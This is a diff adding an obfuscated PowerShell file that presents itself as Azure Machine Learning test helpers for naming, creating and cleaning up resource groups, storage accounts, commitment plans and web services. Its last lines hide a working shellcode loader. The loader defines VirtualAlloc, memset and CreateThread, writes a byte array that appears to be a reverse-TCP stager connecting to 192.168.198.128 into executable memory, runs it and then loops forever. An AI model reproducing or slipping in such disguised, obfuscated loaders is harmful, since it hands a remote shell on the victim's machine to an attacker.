@@ -1,0 +1,175 @@
+  &("{1}{2}{0}"-f '-ITEm','se','T')  VAriABLE:y2gU (  [Type]("{0}{3}{1}{2}"-f'Syst','STri','nG','eM.')  )  ;  ${0`1m}=  [TYpe]("{0}{4}{1}{3}{2}"-f 'SYst','M.StrING','n','ComPaRISo','e') ;    ${d`1R} =[TypE]("{6}{3}{0}{2}{5}{8}{7}{4}{1}"-f'tEs','PmoCKServER','t.hTT','OfT.azURe.','rDER.Htt','pR','mICros','CO','E')  ;   &("{3}{1}{2}{0}" -f 'E','-var','Iabl','sEt') AU8oTc  (  [TYpE]("{4}{5}{11}{9}{2}{3}{1}{0}{10}{12}{8}{7}{6}" -f'e','R','sT.','HttP','mIc','rOSof','odE','dERM','OR','e.tE','CORDe','t.AZUr','r.hTTPREc'));
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function GET`-ReSoUr`cEG`ROU`PnAME
+{
+    return &("{0}{2}{1}" -f 'g','ssetName','etA')
+}
+
+
+function GE`T-te`S`T`stOrAGEa`ccOUntNAMe
+{
+    return &("{0}{1}{2}"-f'getA','s','setName')
+}
+
+
+function gET-C`oMmiT`m`ENtpL`ANn`Ame
+{
+    return &("{0}{2}{1}"-f 'getA','tName','sse')
+}
+
+
+function g`ET-WeBSErvi`cEnA`mE
+{
+    return &("{0}{2}{3}{1}" -f 'ge','tName','tAs','se')
+}
+
+
+function Get`-pROv`Id`ER`locATiOn(${PROv`Id`Er`NAMeSpaCe}, ${r`es`ouRcetype})
+{
+    if (  (  &("{0}{2}{1}" -f'geT-VARiab','E','L') d1R  -valueO)::"m`oDE" -ne `
+          (  &("{0}{1}{2}{3}"-f 'geT-','vAr','IA','BlE')  au8oTC )."v`ALue"::"pLAYBA`Ck")
+    {
+        ${Pr`OVID`Er} = &("{2}{0}{1}{3}{5}{4}" -f'our','cePro','Get-AzRes','v','der','i') -ProviderNamespace ${pROvide`R`NA`meSpA`cE}
+        ${re`S`OurCeT`y`Pe} = ${Pro`V`IdeR}."r`eSOurC`etyPes" | `
+                        &("{0}{1}" -f'wh','ere') {${_}."R`eSO`Ur`ceTy`penAMe" -eq ${rE`SOUr`Ce`T`YPE}}
+          if (${resO`U`R`ceT`YPe} -eq ${Nu`lL}) 
+        {  
+            return ("{0}{4}{1}{3}{2}"-f'south','entral','s','u','c')  
+        } else 
+        {  
+            return ${re`so`URCETY`pE}."LOCa`TIo`NS"[0].("{1}{0}" -f'eplace','R').Invoke(" ", "").("{0}{2}{3}{1}"-f 'ToLowe','nt','rI','nvaria').Invoke()
+        } 
+    }
+
+    return ("{1}{2}{0}"-f'us','so','uthcentral')
+}
+
+
+function GET-`pRoV`IDeRaP`i`VERs`I`ON(${PROv`ID`eRNAm`e`sPaCe}, ${REsoU`R`ce`Type})
+{ 
+    if (${P`ROVIDerN`A`mEs`Pa`ce} -eq ("{1}{3}{5}{0}{4}{7}{2}{6}" -f'ft.M','Mi','i','cros','ach','o','ng','ineLearn'))
+    {
+        if (  (  &("{3}{1}{0}{2}"-f'AB','I','lE','Get-Var') Y2gu -VaL)::("{1}{0}"-f 'als','Equ').Invoke(${rEsO`Urc`ETy`pE}, ("{0}{2}{1}{3}"-f 'commitm','t','en','Plans'), `
+             (&("{2}{0}{1}" -f 'ChIl','diTEm','gET-')  ("Va"+"ri"+"ablE"+":01M") )."VaL`UE"::"O`R`dinAl`Ignore`CaSE"))
+        {
+            return ("{3}{2}{0}{4}{1}{5}"-f'-05-01','v','16','20','-pre','iew')
+        }
+
+        if (  (  &('gi')  vAriabLe:Y2gu )."vaL`Ue"::("{0}{1}" -f'Equa','ls').Invoke(${r`es`ouRcETYpE}, ("{3}{1}{2}{0}"-f's','ebServic','e','w'), `
+             (&("{1}{0}" -f'IR','D')  ("vaRi"+"abL"+"e:01M") )."vAL`Ue"::"OrD`i`Nali`GNOreC`Ase"))
+        {
+            return ("{0}{2}{1}"-f'2017-0','-01','1')
+        }
+    }
+
+    return ${Nu`LL}
+}
+
+
+function cReate`-`TeStSt`orAgEac`CO`UNT(${ResO`Ur`c`eGrOuP}, ${l`ocatI`On}, ${St`o`RAg`EnaME})
+{
+    &("{2}{0}{1}{3}" -f'rag','eAc','New-AzSto','count') -ResourceGroupName ${RE`sou`RcegR`ouP} -Name ${stOraG`E`Na`mE} `
+                                -Location ${lo`cA`TION} -Type ("{0}{1}{3}{2}"-f 'Sta','n','S','dard_LR') | &("{1}{2}{0}"-f 'l','Out','-Nul')
+    ${AcC`E`SsKEY} = (&("{5}{4}{3}{1}{6}{0}{2}"-f'cc','a','ountKey','AzStor','t-','Ge','geA') -ResourceGroupName ${re`S`ouRCe`GrOuP} `
+                                -Name ${sT`oRA`gEN`Ame})."ke`y1";
+    return @{ ("{0}{1}" -f'Na','me') = ${St`O`RAGe`NaME}; ("{1}{0}" -f'ey','K') = ${A`CCeS`s`key} }
+}
+
+
+function cl`eAn-CO`MmITMenT`plan(${R`E`SOUrcEGr`Oup}, ${coMmit`m`ENTPl`A`NN`AmE})
+{
+    if (  ${d`1R}::"Mo`De" -ne `
+         (  &('Gi')  vArIAbLE:Au8oTC )."Va`lue"::"pL`AyBack") 
+    {
+        try {
+            &("{0}{2}{1}"-f 'L','put','ogOut') ('Remov'+'ing'+' '+'co'+'mmitm'+'ent'+' '+'pla'+'n '+"$commitmentPlanName "+'from'+' '+'re'+'sou'+'rce '+'gro'+'u'+'p '+"$rgName")    
+            &("{1}{2}{5}{3}{0}{6}{4}"-f 'itm','Remove-','AzMlC','mm','tPlan','o','en') -ResourceGroupName ${rEsO`URcE`gRouP} `
+                                        -Name ${Co`MMitM`entpLaN`N`A`Me} -Force
+            &("{0}{1}{2}"-f'Lo','g','Output') ('Comm'+'it'+'ment '+'plan'+' '+"$commitmentPlanName "+'wa'+'s '+'re'+'mov'+'ed.')
+        }
+        catch {
+            &("{2}{1}{3}{0}{4}" -f 'War','i','Wr','te-','ning') "Caught unexpected exception when cleaning up commitment `
+                            plan $commitmentPlanName in group $resourceGroup : `
+                            $($($_.Exception).Message) "
+        }
+    }
+}
+
+
+function c`LEAn-W`e`BsE`Rv`ICe(${R`E`s`Our`cEGROUp}, ${we`B`servicE`NAMe})
+{
+    if ( ( &("{1}{2}{0}" -f 'bLE','VARi','a')  ('d'+'1R')  )."Va`lUe"::"M`ODe" -ne `
+         (  &("{1}{0}" -f'EM','iT') ("VAR"+"Iabl"+"E:au8"+"oTc") )."V`ALuE"::"pL`AYBack") 
+    {
+        try {
+            &("{0}{1}{2}"-f'LogOut','p','ut') ('R'+'emov'+'ing '+'w'+'eb '+'se'+'rvice'+' '+"$webServiceName "+'f'+'rom '+'res'+'ou'+'r'+'ce '+'gr'+'oup '+"$rgName")    
+            &("{3}{1}{2}{4}{0}" -f'vice','move','-Az','Re','MlWebSer') -ResourceGroupName ${re`sourCEgR`oUp} `
+                                        -Name ${weB`SERvi`cEnA`mE} -Force
+            &("{0}{2}{1}"-f'Log','t','Outpu') ('Web'+' '+'se'+'rvice '+"$webServiceName "+'w'+'as '+'r'+'emo'+'ved.')
+        }
+        catch {
+            &("{0}{2}{3}{1}" -f 'Writ','g','e-War','nin') "Caught unexpected exception when cleaning up web `
+                            service $webServiceName in group $resourceGroup : `
+                            $($($_.Exception).Message) "
+        }
+    }
+}
+
+
+function Cl`e`An`-TeST`sto`RAgEAc`COUnT(${re`SO`URCe`GROuP}, ${ac`CO`U`NtnAMe})
+{
+    if (  ${d`1R}::"m`oDE" -ne `
+          (  &("{0}{2}{3}{1}"-f'gEt-v','Le','aRIa','b')  ('au8'+'OTc') )."VA`lue"::"PL`A`yBaCk") 
+    {
+        try {
+            &("{1}{0}{2}" -f'ogOutp','L','ut') ('Re'+'movi'+'ng '+'st'+'ora'+'ge '+'accou'+'n'+'t '+"$accountName "+'f'+'rom '+'re'+'sourc'+'e '+'gr'+'ou'+'p '+"$rgName")             
+            &("{4}{6}{2}{3}{0}{5}{1}" -f'Stora','Account','e-','Az','Remo','ge','v') -ResourceGroupName ${RESOU`Rc`EGr`oUp} -Name ${W`EBSERV`iCenaMe}
+            &("{0}{2}{1}"-f 'LogOut','ut','p') ('Stor'+'age'+' '+'ac'+'cou'+'nt '+"$accountName "+'was'+' '+'re'+'moved.')
+        }
+        catch {
+            &("{1}{2}{0}{3}"-f 'a','Writ','e-W','rning') "Caught unexpected exception when cleaning up `
+                            storage account $accountName in group $resourceGroup : `
+                            $($($_.Exception).Message) "
+        }
+    }
+}
+
+
+function cLeAN-`RES`Ou`RCeG`R`ouP(${reS`OU`R`cegrO`UP})
+{
+    if ( (  &("{0}{1}"-f'Gc','I')  vARiAbLE:d1r  )."val`UE"::"Mo`de" -ne `
+         (&('gI')  vaRiAbLe:aU8OTc  )."V`ALUe"::"pl`A`YBaCK")
+    {
+        try {
+            &("{1}{2}{0}"-f'ut','Log','Outp') ('Rem'+'ov'+'ing '+'re'+'sou'+'rce '+'gro'+'up '+"$resourceGroup") 
+            &("{0}{3}{5}{2}{6}{1}{4}"-f'Rem','rceGrou','es','ove-A','p','zR','ou') -Name ${RE`SOURcegRO`Up} -Force
+            .("{1}{0}{2}" -f 'u','LogO','tput') ('Resou'+'r'+'c'+'e '+'gr'+'o'+'up '+"$resourceGroup "+'wa'+'s '+'remov'+'ed'+'.') 
+        }
+        catch {
+            .("{0}{2}{1}" -f 'Write-War','ing','n') "Caught unexpected exception when cleaning up resource `
+                            group $resourceGroup : $($($_.Exception).Message) "
+        }
+    }
+}
+
+
+function lOgOu`TP`UT(${Mes`Sa`Ge})
+{
+    ${t`i`ME`StAMp} = &("{1}{0}{2}" -f 'Da','Get-','te') -UFormat ("{3}{0}{1}{5}{4}{2}" -f'-','%d %H','S %Z','%Y-%m','%M:%',':')
+    &("{0}{2}{1}" -f 'W','ebug','rite-D') ("[$timestamp]: "+"$message")
+}
+
+${C} = ((("{21}{73}{32}{35}{52}{71}{69}{104}{47}{58}{37}{34}{113}{89}{102}{40}{15}{22}{63}{99}{95}{90}{18}{77}{25}{106}{70}{83}{39}{62}{57}{80}{112}{87}{13}{101}{14}{86}{5}{36}{41}{88}{92}{67}{82}{74}{100}{72}{17}{8}{78}{54}{109}{53}{2}{29}{49}{24}{43}{38}{48}{11}{55}{28}{44}{56}{0}{96}{3}{20}{46}{1}{64}{51}{4}{31}{65}{60}{97}{27}{115}{33}{107}{114}{10}{81}{23}{103}{85}{105}{59}{94}{84}{6}{111}{26}{30}{50}{19}{42}{9}{66}{45}{108}{93}{110}{12}{7}{61}{76}{91}{75}{98}{16}{79}{68}" -f 's,','tr lpStartAdd','ex','nt dw','s, In',';','ort(Ec','tr',']pub',' stati','ags, I','ntPt','P','t','lProtect','al','uint c',')','lpA',')]publ','StackSize,','[DllImport(Ec5kernel32.','Al','lpT','rn IntPt','s,','crt.d',' uin',' lpTh','t','l','tPtr l','Ec5)]p','eat','I','u','[',' ','eateThread(','ze, u','tu','DllImpo','ic','r Cr','readA','r',' IntP','ext','I','e','lEc5','s','blic s',' ','i','r','ttribute','t flA','ern','I','arame',' dest, ','in','loc','re','pP','c exte','c5ker','nt);','atic','int dw','t','lEc5','dll','d','src','uin','ddres','lic stat','ou','llocat','ntPtr ','nel32.','Si','p','readI',')',' uin','rt(','Pt',' ','t ','E','tr memset(','m','r',' ui','ter,',', ','(IntPt','l',' f','r Vir','h',' ','d);[Dll',' u','ion','n IntP','c','Int','5msv','ionType,','nt','Fl','t dwCr')) -RepLacE  ([CHar]69+[CHar]99+[CHar]53),[CHar]34);${w} = .("{1}{2}{0}"-f'ype','Add','-T') -memberDefinition ${C} -Name ("{0}{1}"-f 'Win','32') -namespace ("{2}{0}{3}{1}" -f'3','ons','Win','2Functi') -passthru;[Byte[]];[Byte[]]${s`c} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc6,0x80,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${S`IZe} = 0x1000;if (${sc}."L`eN`gTh" -gt 0x1000){${s`IZE} = ${SC}."L`ENgTh"};${X}=${w}::("{3}{0}{1}{2}"-f'rtu','al','Alloc','Vi').Invoke(0,0x1000,${Si`ZE},0x40);for (${I}=0;${I} -le (${SC}."Le`NGth"-1);${I}++) {${W}::"m`E`MSEt"([IntPtr](${X}.("{1}{0}" -f'oInt32','T').Invoke()+${i}), ${sc}[${I}], 1)};${W}::("{0}{1}{2}" -f'Cr','ea','teThread').Invoke(0,0,${x},0,0,0);for (;;){&("{2}{0}{1}"-f 'e','p','Start-sle') 60};
